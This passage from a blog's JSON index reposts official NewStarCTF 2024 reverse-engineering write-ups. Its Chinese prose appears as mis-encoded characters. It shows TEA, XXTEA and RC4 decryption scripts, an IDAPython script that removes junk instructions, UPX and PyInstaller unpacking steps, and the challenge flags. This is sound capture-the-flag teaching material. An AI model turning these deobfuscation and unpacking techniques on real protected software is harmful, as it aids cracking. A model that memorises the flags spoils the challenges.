178,116,69,22,71,52,149,54,23,244,67,149,3,214,51,149,198,214,51,54,167,53,230,54,150,87,67,22,150,151,230,22 }; for (int i = 0; i \u0026lt; 32; i++) { input[i] = ((int)input[i] \u0026gt;\u0026gt; 4) | (16 * input[i]); } unsigned char* temp_0; unsigned char temp; for (int i = 0; ; i++) { if (i \u0026gt;= 16) break; temp_0 = input; temp = input[i]; input[i] = input[32 - i - 1]; temp_0[32 - i - 1] = temp; } printf(\u0026#34;%s\u0026#34;, input); return 0; } è¿è¡Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼ŒæŠŠç»“æœç”¨base64è§£ç å°±èƒ½å¾—åˆ°flagï¼ˆåˆ«å¿˜äº†æ¢è¡¨ï¼‰\nflag{android_is_simple!}\no11vm æ­¥å…¥mainå‡½æ•°ï¼Œå‘ç°å‡½æ•°æµç¨‹å›¾é•¿è¿™æ ·\nåç¼–è¯‘ä»¥å\nå‘ç°æœ‰æ§åˆ¶æµå¹³å¦åŒ–ç‰¹å¾ï¼Œç”¨ d810 å»æ§åˆ¶æµå¹³å¦åŒ–\nå˜æ­£å¸¸å¤šäº†ï¼Œè¿›å…¥å‡½æ•°ï¼Œå‘ç°å¯ç–‘æ•°ç»„\nå¯ä»¥ç”¨ IDA æ’ä»¶ï¼ŒIDA 8.3 è‡ªå¸¦ä¸€ä¸ªæ’ä»¶ findcryptï¼ˆæˆ–è€…ä¸€ä¸ªä¸ªå‡½æ•°æœæŸ¥ï¼‰\nç›´æ¥å‘ç°æœ‰ tea ç‰¹å¾\næ‰¾åˆ° tea ç‰¹å¾ï¼Œå‘ç°æœªé­”æ”¹ï¼Œå­—ç¬¦ä¸²ä¹Ÿæä¾›äº†ï¼Œæ‰¾ä¸ªè„šæœ¬è§£å¯†å¾— flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;cstdint\u0026gt; using namespace std; void TEA_decrypt(uint32_t v[2], const uint32_t key[4]) { uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, delta = 0x9e3779b9; for (int i = 0; i \u0026lt; 32; i++) { v1 -= ((v0 \u0026lt;\u0026lt; 4) + key[2]) ^ (v0 + sum) ^ ((v0 \u0026gt;\u0026gt; 5) + key[3]); v0 -= ((v1 \u0026lt;\u0026lt; 4) + key[0]) ^ (v1 + sum) ^ ((v1 \u0026gt;\u0026gt; 5) + key[1]); sum -= delta; } v[0] = v0; v[1] = v1; } string uint32_to_string(const uint32_t decrypted[8]) { string result; result.reserve(32); for (int i = 0; i \u0026lt; 8; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { char byte = (decrypted[i] \u0026gt;\u0026gt; (8 * j)) \u0026amp; 0xFF; // é€å­—èŠ‚æå– result.push_back(byte); } } return result; } int main() { uint32_t key[4] = {0x11121314, 0x22232425, 0x33343536, 0x41424344}; uint32_t encrypted_flag[8] = {0x38b97e28, 0xb7e510c1, 0xb4b29fae, 0x5593bbd7, 0x3c2e9b9e, 0x1671c637, 0x8f3a8cb5, 0x5116e515}; for (int i = 0; i \u0026lt; 8; i += 2) { TEA_decrypt(\u0026amp;encrypted_flag[i], key); } string decrypted_flag = uint32_to_string(encrypted_flag); cout \u0026lt;\u0026lt; \u0026#34;Decrypted flag: \u0026#34; \u0026lt;\u0026lt; decrypted_flag \u0026lt;\u0026lt; endl; return 0; } flag{011vm_1s_eZ_But_C0MP1EX_!!} æ³¨ï¼šæœ¬ç¯‡wpè½¬è‡ªNewStarCTFå®˜æ–¹wpï¼Œæœ¬æ–‡ä»…åšè½¬è½½è®°å½•\nflowering-shrubs ä½¿ç”¨ IDA å¯ä»¥çœ‹åˆ°ç¨‹åºå®Œå…¨æ— æ³•åˆ†æã€‚\nå†ä»”ç»†çœ‹æ±‡ç¼–å¯ä»¥å‘ç°ï¼Œé¢˜ç›®ä¼¼ä¹åœ¨éšæœºä½ç½®å¤„æ·»åŠ äº†åŒä¸€ä¸ªèŠ±æŒ‡ä»¤ã€‚\nå› æ­¤æˆ‘ä»¬è¦ä½¿ç”¨ IDAPython è‡ªåŠ¨å»é™¤èŠ±æŒ‡ä»¤ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # remove_flower.py import idc import idaapi startaddr=0x1100 endaddr=0x15FF lis=[0x50, 0x51, 0x52, 0x53, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0x81, 0xC3, 0x12, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x18, 0x48, 0x83, 0xC4, 0x18,0xC3] #è¿™ä¸ªforå¾ªç¯æ˜¯å…³é”®ç‚¹ï¼Œæ£€æµ‹ä»¥å½“å‰åœ°å€å¼€å§‹çš„27ä¸ªå­—èŠ‚æ˜¯å¦ç¬¦åˆlisåˆ—è¡¨çš„å†…å®¹ã€‚ for i in range(startaddr,endaddr): flag=True for j in range(i,i+27): if idc.get_wide_byte(j)!=lis[j-i]: flag=False if flag==True: for addr in range(i,i+27): idc.patch_byte(addr,0x90) # å°†è¿™éƒ¨åˆ†å†…å®¹å…¨éƒ¨nopæ‰ for i in range(startaddr,endaddr):# å–æ¶ˆå‡½æ•°å®šä¹‰ idc.del_items(i) for i in range(startaddr,endaddr): # æ·»åŠ å‡½æ•°å®šä¹‰ if idc.get_wide_dword(i)==0xFA1E0FF3: #endbr64 idaapi.add_func(i) lis åˆ—è¡¨ä¸­çš„å†…å®¹å°±æ˜¯èŠ±æŒ‡ä»¤çš„å…¨éƒ¨å†…å®¹ã€‚\nåœ¨ IDA ä¸­é€‰æ‹© File Â» Script fileï¼Œé€‰æ‹©è¯¥ Python æ–‡ä»¶å³å¯ã€‚\næˆ–è€…åœ¨ File Â» Script command ä¸­å°†ä¸Šé¢çš„ä»£ç ç²˜è´´è¿›æ¥ã€‚\nä¹‹åå†æŒ‰ä¸‹ F5 å³å¯çœ‹åˆ°æ¸…æ™°çš„ä¼ªä»£ç ã€‚\néƒ¨åˆ†å‡½æ•°æˆ‘è¿›è¡Œäº†é‡å‘½åã€‚åœ¨å‡½æ•°åä½ç½®å¤„æŒ‰ä¸‹ N å³å¯é‡å‘½å\nå…³é”®å†…å®¹å°±æ˜¯encryptå‡½æ•°ã€‚\nè¿™é‡Œæ˜¯ç”¨äº†é€’å½’ï¼Œä¸€å…± 40 ä¸ªå­—èŠ‚ï¼Œæ¯å››ä¸ªå­—èŠ‚ä¸º 1 ç»„ï¼Œä¸€å…± 10 ç»„ï¼Œé€šè¿‡ get_next_rand å‡½æ•°å¾—åˆ°ä¸‹ä¸€ç»„åŠ å¯†å­—èŠ‚ã€‚ä»”ç»†åˆ†æä¸€ä¸‹å³å¯å†™å‡ºè„šæœ¬ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #solve.py lis=[0x54,0xf4,0x20,0x47,0xfc,0xc4,0x93,0xe6,0x39,0xe0, 0x6e,0x00,0xa5,0x6e,0xaa,0x9f,0x7a,0xa1,0x66,0x39, 0x76,0xb7,0x67,0x57,0x3d,0x95,0x61,0x22,0x55,0xc9, 0x3b,0x4e,0x4f,0xe8,0x66,0x08,0x3d,0x50,0x43,0x3e] str=\u0026#34;uarefirst.\u0026#34; offset_buf=[0,4,32,12,8,24,16,20,28,36] #offset_bufå°±æ˜¯é€šè¿‡åŠ¨æ€è°ƒè¯•æå–å‡ºæ¯ä¸€è½®get_next_randå‡½æ•°çš„è¿”å›å€¼å¾—åˆ°çš„ truekey=[] for i in str: truekey.append(ord(i)) def decrypt(offset,key): a=lis[offset] b=lis[offset+1] c=lis[offset+2] d=lis[offset+3] flagc=((c+key)\u0026amp;0xff)^b flagd=c^d flaga=a^d^key flagb=((b-key)\u0026amp;0xff)^flaga^key lis[offset]=flaga lis[offset+1]=flagb lis[offset+2]=flagc lis[offset+3]=flagd for i in range(10): decrypt(offset_buf[i],truekey[i]) print(bytes(lis).decode(\u0026#39;utf-8\u0026#39;)) # flag{y0u_C4n_3a51ly_Rem0v3_CoNfu510n-!!} flag{y0u_C4n_3a51ly_Rem0v3_CoNfu510n-!!} æ³¨ï¼šæœ¬ç¯‡wpè½¬è‡ªNewStarCTFå®˜æ–¹wpï¼Œæœ¬æ–‡ä»…åšè½¬è½½è®°å½•\nSecretOfKawaii ç¨‹åºåœ¨ Java å±‚æœ‰æ··æ·†ï¼Œç”¨ Jeb å¯ä»¥ç®€å•å»é™¤ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ–­ç‚¹è°ƒè¯•å¼„æ¸…ä»£ç æ‰§è¡Œæµç¨‹\nJava å±‚åªæœ‰ä¸€ä¸ª RC4ï¼Œkeyæ˜¯ rc4k4yï¼ŒåŠ å¯†å Base64 ä¸€ä¸‹ä¼ åˆ° so å±‚ï¼Œå€¼åœ¨ so å±‚æ£€æŸ¥\nIDA æ‰“å¼€å‘ç°æœ‰ upx çš„å­—ç¬¦ä¸²ï¼ŒçŒœæµ‹æ˜¯ upx å£³\nè„±å£³å\nä¸€ä¸ª xxteaï¼Œå¯†é’¥æ˜¯ meow~meow~tea~~~\nå†™å‡ºå¯¹åº”çš„è§£å¯†è„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 #include \u0026#34;stdio.h\u0026#34; #include \u0026#34;string.h\u0026#34; #include \u0026#34;stdlib.h\u0026#34; typedef unsigned int uint32_t; #define size 256 unsigned char sbox[257] = {0}; // åˆå§‹åŒ–sè¡¨ void init_sbox(char *key) { unsigned int i, j, k; int tmp; for (i = 0; i \u0026lt; size; i++) { sbox[i] = i; } j = k = 0; for (i = 0; i \u0026lt; size; i++) { tmp = sbox[i]; j = (j + tmp + key[k]) % size; sbox[i] = sbox[j]; sbox[j] = tmp; if (++k \u0026gt;= strlen((char *)key)) k = 0; } } // åŠ è§£å¯†å‡½æ•° void rc4(char *key, char *data) { int i, j, k, R, tmp; init_sbox(key); j = k = 0; for (i = 0; i \u0026lt; strlen((char *)data); i++) { j = (j + 1) % size; k = (k + sbox[j]) % size; tmp = sbox[j]; sbox[j] = sbox[k]; sbox[k] = tmp; R = sbox[(sbox[j] + sbox[k]) % size]; data[i] ^= R; } } #define DELTA 0xdeadbeef #define MX (((z \u0026gt;\u0026gt; 5 ^ y \u0026lt;\u0026lt; 3) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 2)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n \u0026gt; 1) /* Coding Part */ { rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do { sum += DELTA; e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p = 0; p \u0026lt; n - 1; p++) { y = v[p + 1]; z = v[p] += MX; } y = v[0]; z = v[n - 1] += MX; } while (--rounds); } else if (n \u0026lt; -1) { n = -n; rounds = 6 + 52 / n; sum = rounds * DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p = n - 1; p \u0026gt; 0; p--) { z = v[p - 1]; y = v[p] -= MX; } z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } char base64[65] = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; void decodeBase64(char *str, int len, char **in) { char ascill[129]; int k = 0; for (int i = 0; i \u0026lt; 64; i++) { ascill[base64[i]] = k++; } int decodeStrlen = len / 4 * 3 + 1; char *decodeStr = (char *)malloc(sizeof(char) * decodeStrlen); k = 0; for (int i = 0; i \u0026lt; len; i++) { decodeStr[k++] = (ascill[str[i]] \u0026lt;\u0026lt; 2) | (ascill[str[++i]] \u0026gt;\u0026gt; 4); if (str[i + 1] == \u0026#39;=\u0026#39;) { break; } decodeStr[k++] = (ascill[str[i]] \u0026lt;\u0026lt; 4) | (ascill[str[++i]] \u0026gt;\u0026gt; 2); if (str[i + 1] == \u0026#39;=\u0026#39;) { break; } decodeStr[k++] = (ascill[str[i]] \u0026lt;\u0026lt; 6) | (ascill[str[++i]]); } decodeStr[k] = \u0026#39;\\0\u0026#39;; *in = decodeStr; } int main() { // upx -d è§£åŒ…libmeow1.soï¼ŒåŠ å¯†åªæœ‰ä¸€ä¸ªxxteaï¼Œä½†æ˜¯è¢«é­”æ”¹è¿‡ï¼Œå¯¹ç…§ç½‘ä¸Šçš„ä»£ç ä¿®æ”¹å¯ä»¥è§£å¯† // å¯†æ–‡ä¸º64ä½æ•°ç»„ï¼Œç†Ÿæ‚‰æ•°æ®å¤„ç†çš„è¯ï¼Œç›´æ¥æŒ‡é’ˆä¼ å‚å°±è¡Œäº† long long secrets[6] = { 6866935238662214623LL, 3247821795433987330LL, -3346872833356453065LL, 1628153154909259154LL, -346581578535637655LL, 3322447116203995091LL }; // ä¸åŒç¼–è¯‘å™¨ long çš„å¤§å°å¯èƒ½ä¸åŒï¼Œç”¨ long long è¡¨ç¤º 64 ä½æ•°æ® // ä¸ºä»€ä¹ˆæ˜¯ 12ï¼Ÿ12 ä»£è¡¨æœ‰ 12 æ®µ 32 ä½æ•°æ®ï¼ˆä¹Ÿå°±æ˜¯6ä¸ªlong longç±»å‹æ•°æ®)ï¼Œè´Ÿæ•°æ—¶è¿›è¡Œè§£å¯†æ“ä½œæ‰€ä»¥ä¼  -12 btea((unsigned int *)secrets, -12, ( unsigned int *)\u0026#34;meow~meow~tea~~~\u0026#34;); char *flag; // è§£ base64 decodeBase64((char *)secrets, strlen((char *)secrets), \u0026amp;flag); // è§£ rc4 rc4(\u0026#34;rc4k4y\u0026#34;, (char *)flag); // è¿™é‡Œä¸ºäº†æ–¹ä¾¿ç†è§£è¿™ä¹ˆäº›ï¼Œæƒ³æ–¹ä¾¿å¯ä»¥ç›´æ¥ puts(flag); char *tmp = (char *)flag; for (size_t i = 0; i \u0026lt; 48; i++) { putchar(tmp[i]); } puts(\u0026#34;\u0026#34;); } flag{U_D0_Kn0w_Kawa11_P@n9_B@1} æ³¨ï¼šæœ¬ç¯‡wpè½¬è‡ªNewStarCTFå®˜æ–¹wpï¼Œæœ¬æ–‡ä»…åšè½¬è½½è®°å½•\nPangBaiè¿‡å®¶å®¶(3) å¦‚æœä½ ç”¨äº† DIEï¼Œé‚£åº”è¯¥ä¼šçœ‹åˆ° PyInstaller å­—æ ·ï¼Œè¿™æ˜¯ä¸€ä¸ª Python åº“ï¼Œèƒ½æŠŠ .py è„šæœ¬æ‰“åŒ…æˆ .exe. å¦‚æœä½ ç”¨ IDA ç›´æ¥åˆ†æï¼Œé‡Œé¢å¤§é‡çš„ Python å­—æ ·ä¹Ÿæ˜¯å®ƒçš„æ˜¾è‘—ç‰¹å¾ã€‚å½“ç„¶ï¼Œç›´æ¥ç”¨ IDA æ˜¯éš¾ä»¥åˆ†æ Python è„šæœ¬é€»è¾‘çš„ã€‚\nå¯¹äºæ­¤ç§ç¨‹åºï¼Œè§£åŒ…æ–¹æ³•å¾ˆå¤šï¼Œå¤§å®¶å¯ä»¥ä¸Šç½‘æŸ¥å…³é”®è¯ PyInstaller è§£åŒ…ï¼Œèµ„æ–™ä¹Ÿå¾ˆå¤šã€‚æˆ‘ä½¿ç”¨çš„æ˜¯ PyInstaller Extractor.\nè§£åŒ…åå¾—åˆ°ä¸€ä¸ªç›®å½•ã€‚\nå¯¹äºè¿™ä¸ªé¢˜ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠ å¯†ï¼Œä¹Ÿæ²¡æœ‰é­”æ”¹ magicï¼Œä¹Ÿæ²¡æœ‰åœ¨åº“é‡Œé¢è—ä¸œè¥¿ï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬åªå…³å¿ƒå’Œç¨‹åºåŒåçš„ NotNormalExe.pyc. åç¼–è¯‘ä»–çœ‹é€»è¾‘å³å¯ã€‚\nåç¼–è¯‘æ–¹æ³•ä¹Ÿæœ‰å¾ˆå¤šï¼Œå¦‚åœ¨çº¿ç½‘ç«™ï¼Œæˆ–å„ç§è„šæœ¬ï¼Œå¦‚ tool.lu/pyc.\næ­¤å¤„ç”±äºå­—èŠ‚ç çš„ç‰ˆæœ¬è¾ƒé«˜ï¼Œå‰é¢ä¼šåç¼–è¯‘å‡ºé”™ï¼Œæ­¤æ—¶å¤§å®¶å¯ä»¥ç›´æ¥çŒœè¿™æ˜¯å¼‚æˆ–ï¼Œæˆ–è€…ç”¨å¦ä¸€æ¬¾å·¥å…· pycdas å»çœ‹æœºå™¨ç ï¼Œç„¶åæ‰¾åˆ°å…³é”®çš„å¼‚æˆ–é€»è¾‘ã€‚\næœ¬é¢˜å…¶å®å¯¹äºæ²¡æ¥è§¦è¿‡çš„äººæ¥è¯´ä¸»æ‰“ä¸€ä¸ªçŒœï¼Œè¿˜æœ‰æŸ¥è¯¢èµ„æ–™çš„èƒ½åŠ›ã€‚\nå¦‚æœä¸Šé¢çš„ä¸œè¥¿æ²¡çœ‹æ‡‚ï¼Œè¿™ç¯‡æ–‡ç« å¯èƒ½ä¼šå¸®åŠ©ä½ ã€‚\næ³¨ï¼šæœ¬ç¯‡wpè½¬è‡ªNewStarCTFå®˜æ–¹wpï¼Œæœ¬æ–‡ä»…åšè½¬è½½è®°å½•\n","date":"2024-11-03T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501011926775.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/newstarctf2024-writeup/","title":"NewStarCTF2024 WriteUp"},{"content":"å¾…æ–½å·¥\u0026hellip;\u0026hellip;\n","date":"0001-01-01T00:00:00Z","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/","title":""}]